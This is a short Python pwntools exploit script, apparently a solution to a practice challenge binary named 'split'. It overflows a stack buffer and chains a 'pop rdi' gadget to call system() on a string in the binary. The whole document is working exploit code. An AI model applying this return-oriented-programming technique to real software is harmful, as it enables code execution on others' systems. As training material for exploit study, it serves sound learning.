from pwn import *
fpath = "./split"
offset = 0x28

p = process(fpath)

elf = ELF(fpath)

p_rdi_r = 0x00400883
addr_target = 0x0601060
system_plt	= elf.plt["system"]
payload = offset * 'A' + p64(p_rdi_r) + p64(addr_target) + p64(system_plt)

p.recv()
p.sendline(payload)
print p.recv()